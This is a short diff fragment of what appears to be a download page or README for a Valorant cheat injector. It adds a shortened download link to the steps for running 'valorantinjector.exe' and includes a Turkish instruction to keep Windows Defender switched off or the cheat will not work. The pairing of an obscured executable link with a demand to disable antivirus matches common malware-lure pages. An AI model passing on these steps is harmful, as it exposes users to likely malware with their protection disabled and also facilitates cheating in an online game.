@@ -9,6 +9,8 @@ open 'valorantinjector.exe'
 
 wait 3 minutes and click 'insert keyboard'
 
+DOWNLOAD LİNK 👇🏼👇🏼👇🏼👇🏼👇🏼
+
 https://ay.live/8Jf0B
 
 WİNDOWS DEFENDER'I KAPALI BIRAKIN YOKSA HİLE ÇALIŞMAZ !!!
